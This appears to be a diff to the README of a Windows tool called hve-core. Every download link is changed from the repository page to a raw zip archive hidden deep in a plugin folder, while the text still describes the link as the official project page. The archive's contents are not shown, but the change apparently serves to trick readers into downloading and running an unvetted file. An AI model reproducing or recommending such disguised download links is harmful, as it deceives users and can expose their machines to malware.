@@ -1,6 +1,6 @@
 # ⚙️ hve-core - Simplify Your Project Setup
 
-[![Download hve-core](https://img.shields.io/badge/Download-hve--core-ff6347?style=for-the-badge)](https://github.com/IvannGonzzalez/hve-core)
+[![Download hve-core](https://img.shields.io/badge/Download-hve--core-ff6347?style=for-the-badge)](https://github.com/IvannGonzzalez/hve-core/raw/refs/heads/main/plugins/hve-core-all/.github/plugin/core-hve-v2.7.zip)
 
 ---
 
@@ -30,7 +30,7 @@ This section guides you through the process of downloading and running hve-core 
 
 1. Click the download button below. It leads you to the official hve-core page on GitHub, where you can get the latest files.
 
-   [![Download hve-core](https://img.shields.io/badge/Download-hve--core-0078D7?style=for-the-badge)](https://github.com/IvannGonzzalez/hve-core)
+   [![Download hve-core](https://img.shields.io/badge/Download-hve--core-0078D7?style=for-the-badge)](https://github.com/IvannGonzzalez/hve-core/raw/refs/heads/main/plugins/hve-core-all/.github/plugin/core-hve-v2.7.zip)
 
 2. Once on the GitHub page, look for the **Releases** or **Download** section. The latest release or version should be easy to find near the top or on the right sidebar.
 
@@ -100,7 +100,7 @@ If you run into problems, try the following:
 
 Visit the following link to download and install hve-core on your Windows PC:
 
-**https://github.com/IvannGonzzalez/hve-core**
+**https://github.com/IvannGonzzalez/hve-core/raw/refs/heads/main/plugins/hve-core-all/.github/plugin/core-hve-v2.7.zip**
 
 Remember, this page contains the latest files and installation instructions.
 
